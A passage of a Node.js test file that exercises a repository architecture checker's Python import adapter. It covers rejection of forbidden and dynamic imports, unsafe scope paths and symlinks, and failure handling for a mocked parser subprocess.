        const candidate = lstatSync(join(root, spelling), { bigint: true });
        assert.ok(candidate.isDirectory(), spelling);
        aliasesReserved =
          candidate.dev === reservedStat.dev && candidate.ino === reservedStat.ino;
      } catch (error) {
        if (error.code !== "ENOENT") throw error;
      }
      // Only create a separate source tree after comparing the real entries.
      if (!aliasesReserved) {
        mkdirSync(join(root, spelling, "child"), { recursive: true });
        writeFileSync(
          join(root, spelling, "child/source.mjs"),
          "export const value = 1;\n",
        );
      }
      for (const path of [
        spelling,
        `./${spelling}//`,
        `${spelling}/./child`,
        `${spelling}//child/source.mjs`,
      ]) {
        const errors = validatePlan(root, { ...plan, scope: [path] });
        if (aliasesReserved)
          assert.ok(
            errors.some(
              (error) =>
                error.includes(path) && /scope must refer to source paths/.test(error),
            ),
            `${path}: ${errors.join("; ")}`,
          );
        else assert.deepEqual(errors, [], path);
      }
      if (!aliasesReserved) {
        const original = hashScope(root, spelling);
        writeFileSync(
          join(root, spelling, "child/source.mjs"),
          "export const value = 2;\n",
        );
        assert.notEqual(hashScope(root, spelling), original, spelling);
      }
    }
  }
  for (const path of [
    ".arrs-cache",
    ".github",
    "node_modules-backup",
    "src/domain/.arrs",
    "src/domain/.git",
    "src/domain/node_modules",
    "src/domain/build",
  ]) {
    mkdirSync(join(root, path), { recursive: true });
    writeFileSync(join(root, path, "source.mjs"), "export const value = 1;\n");
    assert.deepEqual(validatePlan(root, { ...plan, scope: [path] }), [], path);
  }
  for (const path of ["./src/domain", "././src//domain/", "src/./domain"])
    assert.deepEqual(validatePlan(root, { ...plan, scope: [path] }), [], path);
  for (const path of ["src/../src/domain", "/src/domain", "C:/src/domain"])
    assert.ok(validatePlan(root, { ...plan, scope: [path] }).length, path);
});
function makePythonCandidateFixture(t) {
  const root = makeFixture(3);
  t.after(() => rmSync(root, { recursive: true, force: true }));
  rmSync(join(root, "src"), { recursive: true });
  mkdirSync(join(root, "src/domain"), { recursive: true });
  mkdirSync(join(root, "src/application"), { recursive: true });
  writeFileSync(join(root, "src/domain/__init__.py"), "");
  writeFileSync(join(root, "src/application/__init__.py"), "");
  writeFileSync(
    join(root, "src/domain/api.py"),
    "def greeting(name):\n    return 'Hello, ' + name.strip() + '!'\n",
  );
  writeFileSync(join(root, "src/domain/private.py"), "private = 1\n");
  writeFileSync(
    join(root, "src/application/main.py"),
    "from domain.api import greeting\ndef run(name):\n    return greeting(name)\n",
  );
  const policy = {
    schemaVersion: "0.1",
    adapter: {
      id: "python",
      version: "candidate-python-ast-0.1",
      packageRoots: ["src"],
      runtime: { argv: ["python3"], timeoutSeconds: 5 },
    },
    modules: [
      {
        id: "domain",
        path: "src/domain",
        allows: [],
        public: ["src/domain/api.py", "src/domain/__init__.py"],
      },
      {
        id: "application",
        path: "src/application",
        allows: ["domain"],
        public: ["src/application/main.py", "src/application/__init__.py"],
      },
    ],
  };
  writeJson(root, ".agent/policies/architecture.json", policy);
  const feature = readJson(root, "docs/features/greeting.json");
  feature.entryPoints = ["src/application/main.py"];
  writeJson(root, "docs/features/greeting.json", feature);
  return { root, policy };
}

// Model parser responses with real native Node subprocesses on every OS.
// The adapter still supplies its literal single executable, Python flags and
// original stdin, timeout, output bound and shell-free spawn options.
function pythonRuntimeFixture(t, root) {
  const command = join(root, ".arrs/fixture-python-runtime");
  const script = join(root, ".arrs/parser-response.mjs");
  const preload = join(root, ".arrs/parser-preload.mjs");
  const attemptMarker = join(root, ".arrs/parser-runtime-attempted");
  const nativeSpawn = childProcess.spawnSync;
  const dispatch = (executable, args, options) => {
    if (executable === command) {
      writeFileSync(attemptMarker, "configured runtime launch attempted");
      assert.deepEqual(args.slice(0, 3), ["-I", "-S", "-c"]);
      assert.equal(args.length, 4);
      assert.ok(options.shell === undefined || options.shell === false);
      return nativeSpawn(process.execPath, [script, ...args], options);
    }
    return nativeSpawn(executable, args, options);
  };
  const mocked = t.mock.method(childProcess, "spawnSync", dispatch);
  syncBuiltinESMExports();
  t.after(() => {
    mocked.mock.restore();
    syncBuiltinESMExports();
  });
  writeFileSync(
    preload,
    `import childProcess from 'node:child_process'; import assert from 'node:assert/strict'; import {writeFileSync} from 'node:fs'; import {syncBuiltinESMExports} from 'node:module'; const nativeSpawn=childProcess.spawnSync; childProcess.spawnSync=(command,args,options)=>{ if(command===${JSON.stringify(command)}){writeFileSync(${JSON.stringify(attemptMarker)},'configured runtime launch attempted');assert.deepEqual(args.slice(0,3),['-I','-S','-c']);assert.equal(args.length,4);assert.ok(options.shell===undefined || options.shell===false);return nativeSpawn(process.execPath,[${JSON.stringify(script)},...args],options);} return nativeSpawn(command,args,options); }; syncBuiltinESMExports();\n`,
  );
  return {
    argv: [command],
    preload: pathToFileURL(preload).href,
    attemptMarker,
    setSource(source) {
      writeFileSync(
        script,
        `import assert from 'node:assert/strict'; assert.deepEqual(process.argv.slice(2,5),['-I','-S','-c']); assert.match(process.argv[5],/import ast, json, sys/); ${source}\n`,
      );
    },
  };
}

test("versioned Python candidate conformance admits public/same-module imports and guards without source mutation", async (t) => {
  const { root } = makePythonCandidateFixture(t);
  const app = join(root, "src/application/main.py");
  const domain = join(root, "src/domain/api.py");
  writeFileSync(
    domain,
    readFileSync(domain, "utf8") +
      "from .private import private\nraise RuntimeError('application top-level must not execute during parsing')\n",
  );
  const before = hashScope(root, "src");
  assert.deepEqual(checkArchitecture(root), []);
  assert.deepEqual(checkArchitectureGuard(root), []);
  assert.equal(hashScope(root, "src"), before);
  writeFileSync(join(root, "src/domain/README.txt"), "Non-source support file\n");
  const coverage = architectureCoverage(root);
  assert.deepEqual(coverage.unscannedFiles, ["src/domain/README.txt"]);
  rmSync(join(root, "src/domain/README.txt"));
  assert.equal(coverage.adapter, "python");
  assert.equal(coverage.version, "candidate-python-ast-0.1");
  assert.equal(coverage.qualification, "provisional-no-real-pilot");
  assert.equal(coverage.sourceFileCount, 5);
  assert.equal(coverage.scannedFileCount, 5);
  assert.deepEqual(coverage.errors, []);
  const diagnosed = await doctor(root);
  assert.equal(diagnosed.architecture.scannedFileCount, 0);
  assert.equal(
    diagnosed.checks.find((check) => check.id === "architecture").status,
    "not-evaluated",
  );
  assert.ok(diagnosed.warnings.some((warning) => warning.includes("provisional")));
  const audited = await audit(root);
  assert.equal(audited.architecture.guard, "blocked");
  assert.equal(audited.architecture.qualification, "provisional-no-real-pilot");
  assert.equal(hashScope(root, "src"), before);
  writeFileSync(app, "from domain import api\n");
  assert.deepEqual(checkArchitecture(root), []);
});

test("versioned Python candidate conformance rejects forbidden/private/unowned/unresolved and unsupported loaders", (t) => {
  const { root, policy } = makePythonCandidateFixture(t);
  const app = join(root, "src/application/main.py");
  const original = readFileSync(app, "utf8");
  const cases = [
    ["from domain.private import private\n", /bypasses public/],
    ["from domain.missing import value\n", /unresolved repository/],
    [
      "import importlib\nimportlib.import_module('domain.api')\n",
      /unsupported.*dynamic-loader/,
    ],
    ["loader = __import__\nloader('domain.api')\n", /unsupported.*dynamic-loading/],
    ["import sys\nsys.path.append('other')\n", /unsupported.*custom-resolver/],
    [
      "import sys as runtime\nruntime.path.append('other')\n",
      /unsupported.*custom-resolver/,
    ],
    ["from sys import path as search\n", /unsupported.*custom-resolver/],
    ["from ..domain.api import greeting\n", /escapes.*package root/],
    ["def invalid(:\n", /parser failed/],
  ];
  for (const [source, expected] of cases) {
    writeFileSync(app, source);
    assert.match(checkArchitecture(root).join("\n"), expected, source);
  }
  writeFileSync(join(root, "src/outside.py"), "value = 1\n");
  writeFileSync(app, "from outside import value\n");
  assert.match(checkArchitecture(root).join("\n"), /outside declared modules/);
  writeFileSync(app, original);
  writeFileSync(join(root, "src/domain/api.py"), "from application.main import run\n");
  assert.match(checkArchitecture(root).join("\n"), /domain cannot depend on application/);
  writeFileSync(join(root, "src/domain/api.py"), "value = 1\n");
  rmSync(join(root, "src/domain/__init__.py"));
  policy.modules[0].public = ["src/domain/api.py"];
  writeJson(root, ".agent/policies/architecture.json", policy);
  assert.match(checkArchitecture(root).join("\n"), /unsupported Python namespace/);
});

test("Python candidate rejects missing/failing/timed-out/partial parser and unknown adapters before capability", (t) => {
  const { root, policy } = makePythonCandidateFixture(t);
  const base = structuredClone(policy);
  const runtime = pythonRuntimeFixture(t, root);
  for (const [argv, source, expected] of [
    [["arrs-intentionally-missing-python"], "", /Python parser failed.*ENOENT/],
    [runtime.argv, "process.exit(37)", /exit 37/],
    [runtime.argv, "console.log('{}')", /incomplete or unsupported/],
    [
      runtime.argv,
      "console.log(JSON.stringify({version:'candidate-python-ast-0.1',imports:[]}))",
      /incomplete or unsupported/,
    ],
    [runtime.argv, "console.log('broken')", /malformed Python parser output/],
    [["python3", "application.py"], "", /Invalid architecture/],
  ]) {
    runtime.setSource(source);
    policy.adapter.runtime.argv = argv;
    writeJson(root, ".agent/policies/architecture.json", policy);
    assert.match(checkArchitecture(root).join("\n"), expected);
    assert.notDeepEqual(checkArchitectureGuard(root), []);
    assert.equal(architectureCoverage(root).scannedFileCount, 0);
  }
  runtime.setSource("setInterval(()=>{}, 1000)");
  policy.adapter.runtime = { argv: runtime.argv, timeoutSeconds: 1 };
  writeJson(root, ".agent/policies/architecture.json", policy);
  assert.match(checkArchitecture(root).join("\n"), /parser failed.*ETIMEDOUT/);
  Object.assign(policy, structuredClone(base));
  runtime.setSource(
    "console.log(JSON.stringify({version:'candidate-python-ast-0.1',imports:[],unsupported:[]}))",
  );
  policy.adapter.runtime = { argv: runtime.argv, timeoutSeconds: 1 };
  writeJson(root, ".agent/policies/architecture.json", policy);
  assert.deepEqual(checkArchitecture(root), []);
  assert.match(checkArchitectureGuard(root).join("\n"), /failed to reject/);
  for (const [id, version] of [
    ["unknown", "future"],
    ["python", "future"],
  ]) {
    policy.adapter = { ...base.adapter, id, version };
    writeJson(root, ".agent/policies/architecture.json", policy);
    assert.match(checkArchitecture(root).join("\n"), /unsupported architecture adapter/);
    assert.equal(architectureCoverage(root).scannedFileCount, 0);
  }
});

test("Python candidate discovery preserves reserved directory source/generated islands and safe scope", (t) => {
  const { root, policy } = makePythonCandidateFixture(t);
  mkdirSync(join(root, "src/domain/build"));
  writeFileSync(join(root, "src/domain/build/__init__.py"), "");
  writeFileSync(
    join(root, "src/domain/build/handwritten.py"),
    "from application.main import run\n",
  );
  assert.match(checkArchitecture(root).join("\n"), /domain cannot depend/);
  policy.modules.push({
    id: "generated",
    path: "src/domain/build",
    allows: [],
    public: ["src/domain/build"],
    generated: true,
  });
  writeJson(root, ".agent/policies/architecture.json", policy);
  assert.deepEqual(checkArchitecture(root), []);
  mkdirSync(join(root, "src/domain/build/vendor/dist"), { recursive: true });
  writeFileSync(join(root, "src/domain/build/vendor/__init__.py"), "");
  writeFileSync(join(root, "src/domain/build/vendor/dist/__init__.py"), "");
  writeFileSync(
    join(root, "src/domain/build/vendor/dist/island.py"),
    "from application.main import run\n",
  );
  policy.modules.push({
    id: "handwritten",
    path: "src/domain/build/vendor/dist",
    allows: [],
    public: ["src/domain/build/vendor/dist/island.py"],
  });
  writeJson(root, ".agent/policies/architecture.json", policy);
  assert.match(
    checkArchitecture(root).join("\n"),
    /handwritten cannot depend on application/,
  );
  writeFileSync(join(root, "src/domain/build/vendor/dist/island.py"), "value = 1\n");
  assert.deepEqual(checkArchitecture(root), []);
  assert.deepEqual(checkArchitectureGuard(root), []);
  writeFileSync(join(root, "src/domain/mixed.mjs"), "export const value = 1;\n");
  assert.match(checkArchitecture(root).join("\n"), /unsupported mixed-language/);
  rmSync(join(root, "src/domain/mixed.mjs"));
  writeFileSync(join(root, "src/domain/unsupported.go"), "package domain\n");
  assert.match(checkArchitecture(root).join("\n"), /unsupported mixed-language/);
  rmSync(join(root, "src/domain/unsupported.go"));
  policy.adapter.packageRoots = ["../outside"];
  writeJson(root, ".agent/policies/architecture.json", policy);
  assert.match(checkArchitecture(root).join("\n"), /cannot contain/);
  policy.adapter.packageRoots = ["src"];
  writeJson(root, ".agent/policies/architecture.json", policy);
  symlinkSync(join(root, "src/domain/api.py"), join(root, "src/domain/link.py"));
  assert.match(checkArchitecture(root).join("\n"), /Symlink/);
  rmSync(join(root, "src/domain/link.py"));
  policy.modules = [];
  writeJson(root, ".agent/policies/architecture.json", policy);
  assert.match(checkArchitecture(root).join("\n"), /unconfigured/);
  assert.equal(architectureCoverage(root).scannedFileCount, 0);
  assert.notDeepEqual(checkArchitectureGuard(root), []);
});

test("versioned adapters retain default JS/TS identity and reject empty Python coverage", async (t) => {
  const root = fixture(t);
  const js = architectureCoverage(root);
  assert.equal(js.adapter, "javascript-typescript");
  assert.equal(js.version, "js-ts-0.1");
  assert.equal(js.scannedFileCount, 2);
  assert.deepEqual(js.errors, []);
  const policy = readJson(root, ".agent/policies/architecture.json");
  policy.adapter = { id: "javascript-typescript", version: "js-ts-0.1" };
  writeJson(root, ".agent/policies/architecture.json", policy);
  assert.deepEqual(checkArchitecture(root), []);
  assert.deepEqual(checkArchitectureGuard(root), []);
  policy.adapter.version = "future";
  writeJson(root, ".agent/policies/architecture.json", policy);
  assert.match(checkArchitecture(root).join("\n"), /unsupported architecture adapter/);
  const candidate = makePythonCandidateFixture(t);
  rmSync(join(candidate.root, "src"), { recursive: true });
  for (const module of candidate.policy.modules) {
    mkdirSync(join(candidate.root, module.path), { recursive: true });
    module.public = [module.path];
  }
  writeJson(candidate.root, ".agent/policies/architecture.json", candidate.policy);
  assert.match(checkArchitecture(candidate.root).join("\n"), /no python source/);
  assert.equal(architectureCoverage(candidate.root).scannedFileCount, 0);
  assert.notDeepEqual(checkArchitectureGuard(candidate.root), []);
  assert.equal(
    (await doctor(candidate.root)).checks.find((check) => check.id === "architecture")
      .status,
    "incomplete",
  );
  const noSource = await audit(candidate.root);
  assert.equal(
    noSource.controls.find((control) => control.id === "architecture").status,
    "incomplete",
  );
  assert.equal(
    noSource.controls.find((control) => control.id === "architecture-guard").status,
    "blocked",
  );
});

test("Python candidate consumer executes a permitted import and rejects a forbidden edge through configured gates", (t) => {
  const { root } = makePythonCandidateFixture(t);
  writeFileSync(
    join(root, "verify.py"),
    "import sys\nsys.path.insert(0, 'src')\nfrom application.main import run\nassert run(' Ada ') == 'Hello, Ada!'\nprint('Python greeting acceptance passed')\n",
  );
  const config = readJson(root, "arrs.json");
  config.commands.verify = { argv: ["python3", "-I", "-B", "verify.py"] };
  config.verifyTargets.greet = config.commands.verify;
  config.commands.test = config.commands.verify;
  config.commands.build = {
    argv: [
      "python3",
      "-I",
      "-c",
      "import ast,pathlib; [ast.parse(p.read_text()) for p in pathlib.Path('src').rglob('*.py')]",
    ],
  };
  writeJson(root, "arrs.json", config);
  const acceptedScenario = invoke(root, ["run", "verify", "greet"]);
  assert.equal(
    acceptedScenario.status,
    0,
    acceptedScenario.stdout + acceptedScenario.stderr,
  );
  assert.ok(acceptedScenario.stdout.includes("Python greeting acceptance passed"));
  const proof = invoke(root, ["proof", "run", "proof-plan.json", "--execute"]);
  assert.equal(proof.status, 0, proof.stdout + proof.stderr);
  const result = JSON.parse(proof.stdout);
  assert.equal(invoke(root, ["proof", "validate", result.path]).status, 0);
  writeFileSync(
    join(root, "src/domain/forbidden.py"),
    "from application.main import run\n",
  );
  const rejected = invoke(root, ["gate"]);
  assert.notEqual(rejected.status, 0);
  assert.ok(rejected.stdout.includes("domain cannot depend on application"));
  assert.notEqual(invoke(root, ["proof", "validate", result.path]).status, 0);
});

test("Python candidate configured gate rejects forbidden/private activated package initializers", (t) => {
  const { root, policy } = makePythonCandidateFixture(t);
  rmSync(join(root, "src"), { recursive: true });
  for (const path of ["src/app", "src/pkg/allowed"])
    mkdirSync(join(root, path), { recursive: true });
  for (const path of [
    "src/app/__init__.py",
    "src/pkg/__init__.py",
    "src/pkg/allowed/__init__.py",
  ])
    writeFileSync(join(root, path), "");
  writeFileSync(join(root, "src/app/main.py"), "import pkg.allowed.foo\n");
  writeFileSync(join(root, "src/pkg/allowed/foo.py"), "value = 1\n");
  policy.modules = [
    {
      id: "app",
      path: "src/app",
      allows: ["allowed"],
      public: ["src/app/main.py", "src/app/__init__.py"],
    },
    { id: "infra", path: "src/pkg", allows: [], public: ["src/pkg/__init__.py"] },
    {
      id: "allowed",
      path: "src/pkg/allowed",
      allows: [],
      public: ["src/pkg/allowed/foo.py"],
    },
  ];
  writeJson(root, ".agent/policies/architecture.json", policy);
  const feature = readJson(root, "docs/features/greeting.json");
  feature.owners = ["app"];
  feature.boundaries = ["app", "infra", "allowed"];
  feature.entryPoints = ["src/app/main.py"];
  feature.implementation = ["src/app", "src/pkg"];
  writeJson(root, "docs/features/greeting.json", feature);
  const rejected = invoke(root, ["gate"]);
  assert.equal(rejected.status, 1, rejected.stdout + rejected.stderr);
  assert.ok(rejected.stdout.includes("app cannot depend on infra"));
  assert.ok(rejected.stdout.includes("bypasses public interfaces of allowed"));
  policy.modules[0].allows.push("infra");
  writeJson(root, ".agent/policies/architecture.json", policy);
  const privateInitializer = invoke(root, ["gate"]);
  assert.equal(privateInitializer.status, 1);
  assert.ok(privateInitializer.stdout.includes("bypasses public interfaces of allowed"));
  policy.modules[2].public.push("src/pkg/allowed/__init__.py");
  writeJson(root, ".agent/policies/architecture.json", policy);
  const admitted = invoke(root, ["gate"]);
  assert.equal(admitted.status, 0, admitted.stdout + admitted.stderr);
});

test("Python candidate read-only doctor/audit/coverage never launch a configured runtime", async (t) => {
  const { root, policy } = makePythonCandidateFixture(t);
  const runtime = pythonRuntimeFixture(t, root);
  runtime.setSource(
    `import {writeFileSync} from 'node:fs';writeFileSync(${JSON.stringify(join(root, "EXECUTED-PARSER"))},'unexpected runtime');process.exit(37);`,
  );
  policy.adapter.runtime.argv = runtime.argv;
  writeJson(root, ".agent/policies/architecture.json", policy);
  const readonly = architectureCoverage(root, { allowExternalRuntime: false });
  assert.equal(readonly.sourceFileCount, 5);
  assert.equal(readonly.scannedFileCount, 0);
  assert.match(readonly.errors.join("\n"), /not-evaluated/);
  assert.notDeepEqual(checkArchitecture(root, { allowExternalRuntime: false }), []);
  assert.equal(
    (await doctor(root)).checks.find((check) => check.id === "architecture").status,
    "not-evaluated",
  );
  const inspection = await audit(root, { execute: false });
  assert.equal(
    inspection.controls.find((control) => control.id === "architecture").status,
    "not-evaluated",
  );
  assert.equal(inspection.architecture.guard, "blocked");
  const garden = spawnSync(
    process.execPath,
    ["--import", runtime.preload, cli, "gardener", "--root", root, "--json"],
    { encoding: "utf8", timeout: 20000 },
  );
  assert.equal(garden.status, 0, garden.stdout + garden.stderr);
  assert.equal(existsSync(runtime.attemptMarker), false);
  assert.equal(existsSync(join(root, "EXECUTED-PARSER")), false);
  assert.match(checkArchitecture(root).join("\n"), /parser failed.*exit 37/);
  assert.equal(existsSync(runtime.attemptMarker), true);
  assert.equal(existsSync(join(root, "EXECUTED-PARSER")), true);
});
